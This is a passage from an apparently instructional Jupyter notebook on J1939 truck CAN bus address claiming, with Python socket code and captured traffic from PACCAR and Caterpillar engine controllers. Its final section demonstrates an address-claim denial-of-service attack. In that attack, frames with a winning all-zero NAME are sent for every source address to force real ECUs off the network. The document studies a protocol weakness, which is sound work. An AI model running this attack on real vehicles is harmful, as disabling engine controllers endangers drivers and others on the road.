    "can_data = b'\\x00\\xee\\x00'\n",
    "\n",
    "can_dlc = min(len(can_data),8)\n",
    "\n",
    "can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )\n",
    "print(can_packet)\n",
    "    \n",
    "#Send out the CAN frame\n",
    "sock.send(can_packet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response to this request from the PACCAR ECM was  its address claimed:\n",
    "\n",
    "```\n",
    "can1  18EEFF00   [8]  06 03 BF 01 00 00 00 10\n",
    "```\n",
    "\n",
    "If we send this to a Caterpillar ECU, we get the following:\n",
    "```\n",
    "  can1  18EEFF00   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF0F   [8]  01 02 03 01 00 0C 00 90\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_ID = 0b00000001000000010110101111010000\n",
      "manufacturer_code = 8\n",
      "serial_num =  93136\n"
     ]
    }
   ],
   "source": [
    "#NAME_ID = struct.unpack(\"<L\",b'\\x01\\x02\\x03\\x01')[0]\n",
    "NAME_ID = struct.unpack(\"<L\",b'\\xD0\\x6B\\x01\\x01')[0]\n",
    "manufacturer_code = (manufacturer_code_mask & NAME_ID) >> 21\n",
    "print(\"NAME_ID = 0b{:032b}\".format(NAME_ID)) \n",
    "print('manufacturer_code =', manufacturer_code)\n",
    "\n",
    "serial_num = identity_mask & NAME_ID\n",
    "print('serial_num = ',serial_num)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In J1939, the following entry exists for Manufacturer IDs\n",
    "```\n",
    "8\tCaterpillar Inc.\tPeoria, IL   USA\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Resolving Contentions\n",
    "Why did the Caterpillar give up it's address?\n",
    "\n",
    "The NAME with the lower value wins."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "NAME_cat = bytes.fromhex('D0 6B 01 01 00 00 00 80')\n",
    "NAME_paccar = bytes.fromhex('06 03 BF 01 00 00 00 10')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "9223372036871646160"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Convert these NAMEs to numerical values:\n",
    "number_cat = struct.unpack(\"<Q\",NAME_cat)[0]\n",
    "number_cat"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1152921504636142342"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "number_paccar = struct.unpack(\"<Q\",NAME_paccar)[0]\n",
    "number_paccar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PACCAR ECU has the lower NAME, thus a higher priority.\n"
     ]
    }
   ],
   "source": [
    "if number_paccar < number_cat:\n",
    "    print(\"PACCAR ECU has the lower NAME, thus a higher priority.\")\n",
    "else:\n",
    "    print(\"CAT ECU has the lower NAME, thus a higher priority.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's try this experiment again, but with a high number for the NAME. Specifically, let's set the NAME to all 1's."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x80\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "16"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "can_id = 0x18EEFF80\n",
    "\n",
    "#Set the extended frame format bit.\n",
    "can_id |= socket.CAN_EFF_FLAG\n",
    "  \n",
    "# Make a low priority NAME\n",
    "can_data = b'\\xFF'*8\n",
    "\n",
    "can_dlc = min(len(can_data),8)\n",
    "\n",
    "can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )\n",
    "print(can_packet)\n",
    "    \n",
    "#Send out the CAN frame\n",
    "sock.send(can_packet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The network session record for Address Claimed is\n",
    "```\n",
    "debian@beaglebone:~/TruckCapeProjects$ candump any |grep 18EE\n",
    "  can1  18EEFF00   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF0F   [8]  01 02 03 01 00 0C 00 90\n",
    "  can1  18EEFF00   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF0F   [8]  01 02 03 01 00 0C 00 90\n",
    "  can1  18EEFF00   [8]  FF FF FF FF FF FF FF FF\n",
    "  can1  18EEFF00   [8]  D0 6B 01 01 00 00 00 80\n",
    "```\n",
    "\n",
    "The CAT module send out 2 copies of the Address Claim messages, one for the Engine controller application and the other for the engine retarder application.\n",
    "\n",
    "The script above produced a claim on the source address of 0x00 with a NAME of all F's. This means is a large number and would have low priority. So, the CAT module responded and asserted it's address again. \n",
    "\n",
    "If the script above was compliant with J1939, then then next step would be to select a new address. \n",
    "\n",
    "If there were no new addresses available, then the ECU would have to send out a notice that no more addresses were available. It does this by claiming the null address, which is 0xFE = 254.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Address Claim Cyber Attack\n",
    "The protocol for claiming addresses on J1939 has a fundamental flaw from a security perspective... it trusts the address claim of other nodes without a check on their legitimacy. Furthermore, the protocol requires controller applications that can't claim an address to stop participating on the network. This means"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x00\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x01\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x02\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x03\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x04\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x05\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x06\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x07\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x08\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\t\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\n\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x0b\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x0c\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\r\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x0e\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x0f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x10\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x11\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x12\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x13\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x14\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x15\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x16\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x17\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x18\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x19\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1a\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1b\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1c\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1d\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1e\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x1f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b' \\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'!\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\"\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'#\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'$\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'%\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'&\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b\"'\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n",
      "b'(\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b')\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'*\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'+\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b',\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'-\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'.\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'/\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'5\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'6\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'7\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'8\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'9\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b':\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b';\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'<\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'=\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'>\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'?\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'@\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'A\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'B\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'C\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'D\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'E\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'F\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'G\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'H\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'I\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'J\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'K\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'L\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'M\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'N\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'O\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'P\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'Q\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'R\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'S\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'T\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'U\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'V\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'W\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'X\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'Y\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'Z\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'[\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\\\\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b']\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'^\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'_\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'`\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'a\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'b\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'c\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'd\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'e\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'g\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'h\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'i\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'j\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'k\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'l\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'm\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'n\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'o\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'p\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'q\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'r\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b's\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b't\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'u\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'v\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'w\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'x\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'y\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'z\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'{\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'|\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'}\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'~\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x7f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x80\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x81\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x82\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x83\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x84\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x85\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x86\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x87\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x88\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x89\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8a\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8b\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8c\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8d\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8e\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x8f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x90\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x91\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x92\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x93\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x94\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x95\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x96\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x97\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x98\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x99\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9a\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9b\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9c\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9d\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9e\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\x9f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa0\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa1\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa2\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa3\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
      "b'\\xa4\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n",
